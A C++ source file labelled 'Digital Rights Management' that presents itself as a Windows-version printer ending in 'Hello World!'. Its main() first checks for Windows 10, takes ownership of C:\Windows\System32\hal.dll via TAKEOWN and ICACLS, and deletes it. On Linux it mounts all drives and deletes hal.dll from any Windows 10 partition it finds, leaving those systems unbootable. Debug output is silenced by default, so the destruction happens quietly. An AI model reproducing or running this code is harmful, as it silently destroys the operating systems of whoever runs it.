/* Адриан Баррето 19/02/18
 * Copyright (c) 2018 TTFH
 * Digital Rights Management
 * This software is distributed "as-is", with no warranty expressed or implied,
 * and no guarantee for accuracy or applicability to any purpose. 
 */

#include <assert.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <shlobj.h>
#include <windows.h>
#else
#include <sys/stat.h>
#endif

// #define DEBUG 1
#ifdef DEBUG
#define print printf
#else
#define print do_nothing
#endif

#define RED    "\x1b[91m"
#define GREEN  "\x1b[92m"
#define BLUE   "\x1b[94m"
#define NORMAL "\x1b[0m"

static void do_nothing(auto n, ...) {}

enum OS_Lang { English, Spanish };
enum AccessLevel { User = 1, Admin = 2, System = 3 };
enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };

OS_Lang language;

WinVer WindowsVersion() {
#ifdef _WIN32
  FILE* script = fopen("version.cmd", "w");
  if (script == nullptr) return Error;
  fputs("@Echo off\n del /F version >nul 2>&1\n ver > version", script);
  fclose(script);
  system("C:\\Windows\\System32\\cmd.exe /C version.cmd");
  remove("version.cmd");

  unsigned int major, minor;
  char* strver = new char[8];
  FILE* ver = fopen("version", "r");
  if (ver == nullptr) return Error;
  int readed = fscanf(ver, "\nMicrosoft Windows [%s %u.%u.", strver, &major, &minor);
  fclose(ver);
  remove("version");

  if (readed != 3) return Error;
  assert(strlen(strver) + 1 == 8);
  language = strcmp(strver, "Version") == 0 ? English : Spanish;
  delete strver;

  switch (major) {
    case 10:
      return Win10;
    case 6:
      switch (minor) {
        case 3: return Win8_1;
        case 2: return Win8;
        case 1: return Win7;
        case 0: return WinVista;
      }
    break;
    case 5:
      switch (minor) {
        case 2: return WinXP64;
        case 1: return WinXP32;
        case 0: return Win2000;
      }
    break;
  }
#endif
  return Other;
}

static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
  if (file == nullptr) return false;
  char* takeown = new char[strlen(file) + 24];
  strcpy(takeown, "TAKEOWN /F ");
  strcat(takeown, file);
  strcat(takeown, " /A");
  print("Executing: %s\n", takeown);
  strcat(takeown, ">nul 2>&1");
  assert(strlen(takeown) + 1 == strlen(file) + 24);
  system(takeown);
  delete takeown;

  char* grant = language == English ? new char[strlen(file) + 41] : new char[strlen(file) + 42];
  strcpy(grant, "ICACLS ");
  strcat(grant, file);
  if (language == English)
    strcat(grant, " /GRANT Administrators:F");
  else
    strcat(grant, " /GRANT Administradores:F");
  print("Executing: %s\n", grant);
  strcat(grant, ">nul 2>&1");
  assert(strlen(grant) + 1 <= strlen(file) + 42);
  system(grant);
  delete grant;

  program = System;
  return true;
}

static bool IsUserSystem(AccessLevel& program, const char* file) {
  program = User;
#ifdef _WIN32
  if (IsUserAnAdmin()) {
    program = Admin;
    return GetSystem(program, file);
  } else {
    MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
#ifndef DEBUG
    exit(EXIT_FAILURE);
#endif
  }
#endif
  return false;
}

void DeleteIf(bool cond, const char* path) {
  if (cond) {
    AccessLevel program;
    if (IsUserSystem(program, path))
      remove(path);

    switch (program) {
      case User: print("Running has User\n");
      break;
      case Admin: print("Running has Admin\n");
      break;
      case System: print("Running has System\n");
      break;
    }
  }
}

void MountAllDevices() {
#ifndef _WIN32
  print(BLUE "Mounting all drives..." NORMAL "\n\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 == \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];

  while (fscanf(drive_list, "%s\n", drive) == 1) {
    print("Unmounted drive found in: %s\n", drive);

    print("Mounting drive...\n");
    char* mount = new char[strlen(drive) + 46];
    strcpy(mount, "udisksctl mount -b /dev/");
    strcat(mount, drive);
    strcat(mount, " > media 2> /dev/null");
    assert(strlen(mount) + 1 == strlen(drive) + 46);
    system(mount);
    delete mount;

    FILE* media = fopen("media", "r");
    assert(media != nullptr);
    char source[32];
    int mounted = fscanf(media, "Mounted %s at %s", drive, source);
    fclose(media);
    remove("media");
    if (mounted != 2) {
      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL "\n\n", drive);
      continue;
    }

    // Remove dot at eol.
    int length = strlen(source);
    source[length - 1] = '\0';
    print("Drive %s mounted in: %s\n", drive, source);
    print("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

void DeleteIfExist(const char* cond, const char* target) {
#ifndef _WIN32
  print(BLUE "Looking for mounted drives..." NORMAL "\n\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 != \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];
  char source[32];

  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
    print("Drive %s mounted in: %s\n", drive, source);
    if (strcmp(source, "/") == 0) strcpy(source, "\0");
    char* name = new char[strlen(source) + strlen(cond) + 1];
    strcpy(name, source);
    strcat(name, cond);
    assert(strlen(name) + 1 == strlen(source) + strlen(cond) + 1);
    print("Looking for file: %s\n", name);

    struct stat buffer;
    if (stat(name, &buffer) == 0) {
      print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
      char* del = new char[strlen(source) + strlen(target) + 1];
      strcpy(del, source);
      strcat(del, target);
      assert(strlen(del) + 1 == strlen(source) + strlen(target) + 1);
      print("Deleting %s ...\n", del);
      if (remove(del) == 0)
        print(GREEN "INFO: File successfully deleted" NORMAL "\n");
      if (stat(del, &buffer) == 0) {
        printf(RED "ERROR: Read-Only filesystem in: " NORMAL "/dev/%s\n", drive);
        printf(GREEN "INFO: Execute: " BLUE "shutdown /s /t 0");
        printf(GREEN " from Windows to turn it off." NORMAL "\n");
      }
      delete del;
    }
    delete name;
    print("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

int main(int argc, char* argv[]) {
  DeleteIf(WindowsVersion() == Win10, "C:\\Windows\\System32\\hal.dll");
  MountAllDevices();
  DeleteIfExist("/Windows/System32/D3D12.dll", "/Windows/System32/hal.dll");

  printf("You are using Windows ");
  WinVer ver = WindowsVersion();
  switch (ver) {
    case Win10: printf("10");
    break;
    case Win8_1: printf("8.1");
    break;
    case Win8: printf("8");
    break;
    case Win7: printf("7");
    break;
    case WinVista: printf("Vista");
    break;
    case WinXP64: printf("XP x64");
    break;
    case WinXP32: printf("XP x86");
    break;
    case Win2000: printf("2000");
    break;
    case Other: printf("%c... no, you're not.", 8);
    break;
    case Error: printf("--- ERROR ---");
    break;
  }
  printf("\n\n");

  // Main program start here.
  printf("Hello World!");
  getchar();
  return 0;
}

/* ------------ HEADER ------------ *
  enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
  void MountAllDevices();
  WinVer WindowsVersion();
  void DeleteIf(bool, const char*);
  void DeleteIfExist(const char*, const char*);
*/
